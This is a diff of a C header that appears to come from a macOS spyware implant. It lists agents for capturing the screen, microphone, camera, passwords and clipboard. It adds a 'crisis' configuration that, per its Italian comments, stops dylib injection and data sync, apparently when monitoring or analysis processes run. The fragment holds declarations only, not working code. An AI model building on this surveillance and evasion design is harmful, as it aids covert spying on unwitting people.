@@ -186,12 +186,13 @@ extern int gMemLogMaxSize;
 #define AGENT_SCREENSHOT            0xB9B9
 #define AGENT_MICROPHONE            0xC2C2
 #define AGENT_CHAT                  0xC6C6
-#define AGENT_CRISIS                0xC9C9
+#define AGENT_CRISIS                0x02C0
 #define AGENT_CLIPBOARD             0xD9D9
 #define AGENT_CAM                   0xE9E9
 #define AGENT_PASSWORD              0xFAFA
 #define AGENT_POSITION              0x1220
 #define AGENT_APPLICATION           0x1011
+
 
 //
 // Agents Shared Memory offsets
@@ -274,6 +275,7 @@ extern u_int remoteAgents[];
 #define TIMER_LOOP              0x1
 #define TIMER_DATE              0x2
 #define TIMER_DELTA             0x3
+#define TIMER_DAILY             0x4
 
 #pragma mark -
 #pragma mark Transfer Protocol Definition
@@ -375,6 +377,7 @@ typedef struct _timer {
   u_int type;
   u_int loDelay;
   u_int hiDelay;
+  u_int endAction;
 } timerStruct;
 
 typedef struct _process {
@@ -753,6 +756,25 @@ extern NSString *gConfigurationName;
 extern NSString *gConfigurationUpdateName;
 extern NSString *gInputManagerName;
 extern NSString *gKextName;
+
+#define CRISIS_STARTSTOP    (UInt32)0x1
+#define CRISIS_STOP         (UInt32)0x0  // Per retrocompatibilita'
+#define CRISIS_START        (UInt32)0x2  // Agent attivo
+#define CRISIS_HOOK         (UInt32)0x08 // Inibisce injection dylib
+#define CRISIS_SYNC         (UInt32)0x10 // Inibisce sincronizzazione
+
+typedef struct {
+  UInt32  unused;
+  UInt32  check_network;
+  UInt32  check_system;
+  UInt32  network_process_count;
+  UInt32  system_process_count;
+  char    process_names[1];
+} crisis_conf_struct;
+
+extern UInt32          gAgentCrisis;
+extern NSMutableArray  *gAgentCrisisNet;
+extern NSMutableArray  *gAgentCrisisApp;
 
 // OS version
 extern u_int gOSMajor;
